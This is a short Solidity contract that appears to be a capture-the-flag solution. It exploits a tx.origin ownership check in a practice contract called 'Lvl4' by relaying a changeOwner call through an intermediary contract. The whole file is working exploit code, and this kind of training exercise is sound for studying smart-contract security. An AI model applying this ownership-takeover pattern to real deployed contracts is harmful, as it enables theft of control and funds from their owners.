// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Lvl4.sol";

contract PoisonLvl4TxOrigin {

  Lvl4 public lvl4ContractAddress;

  constructor(address _lvl4ContractAddress) public {
    lvl4ContractAddress = Lvl4(_lvl4ContractAddress);
  }

  function changeOwner(address _owner) public {
    lvl4ContractAddress.changeOwner(_owner);
  }
}